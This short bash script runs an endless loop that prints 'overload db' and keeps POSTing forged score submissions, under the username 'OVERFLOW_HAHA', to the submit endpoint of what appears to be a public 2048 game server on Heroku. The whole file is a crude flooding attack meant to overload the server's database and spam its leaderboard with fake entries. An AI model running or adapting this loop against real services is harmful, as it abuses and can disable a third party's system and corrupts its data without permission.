while true
do
	echo "overload db"
	curl --data "username=OVERFLOW_HAHA&score=555&grid={}" https://gameserver2048.herokuapp.com/submit
done
